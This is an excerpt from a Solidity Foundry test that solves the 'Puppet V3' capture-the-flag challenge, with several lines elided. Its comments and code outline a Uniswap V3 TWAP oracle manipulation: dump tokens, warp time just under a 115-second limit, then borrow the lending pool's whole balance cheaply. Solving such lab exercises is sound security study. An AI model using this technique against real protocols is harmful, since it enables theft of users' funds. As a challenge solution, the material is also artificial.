...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        // Aegis sweep -> oracle manipulation (Uniswap V3 TWAP): dump tokens to move the spot price, warp
        // just under the 115s limit so the 10-min TWAP shifts, then borrow the whole pool cheap.
        ISwapRouterMin router = ISwapRouterMin(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        ...
        vm.warp(block.timestamp + 114); // shift the TWAP, stay under the 115s window

        weth.deposit{value: player.balance}();
        uint256 dep = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), dep);
